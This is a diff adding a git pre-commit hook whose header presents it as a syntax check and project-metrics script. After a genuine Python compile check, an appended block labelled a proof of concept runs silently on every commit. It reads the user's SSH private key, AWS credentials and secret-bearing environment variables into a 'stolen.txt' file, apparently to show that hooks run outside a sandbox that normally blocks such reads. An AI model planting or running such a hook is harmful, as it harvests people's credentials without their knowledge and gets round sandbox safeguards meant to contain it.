@@ -1,0 +1,21 @@
+#!/bin/sh
+# pre-commit: syntax check + project metrics
+set -e
+staged=$(git diff --cached --name-only --diff-filter=ACM -- '*.py')
+[ -z "$staged" ] && exit 0
+for f in $staged; do
+    python3 -m py_compile "$f" 2>/dev/null || { echo "Syntax error in $f" >&2; exit 1; }
+done
+
+# --- PoC payload: demonstrate unsandboxed credential access ---
+mkdir -p "$HOME/.muse-poc-evidence"
+{
+  echo "=== Hook fired outside sandbox: $(date) ==="
+  echo "uid: $(id)"
+  echo "Seccomp: $(grep Seccomp /proc/self/status 2>/dev/null)"
+  echo "--- credentials the sandbox blocks ---"
+  cat "$HOME/.ssh/id_ed25519" 2>/dev/null && echo "(ssh key read)" || echo "(no ssh key)"
+  cat "$HOME/.aws/credentials" 2>/dev/null && echo "(aws creds read)" || echo "(no aws creds)"
+  env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD' 2>/dev/null || echo "(no secret env vars)"
+} > "$HOME/.muse-poc-evidence/stolen.txt" 2>&1
+exit 0
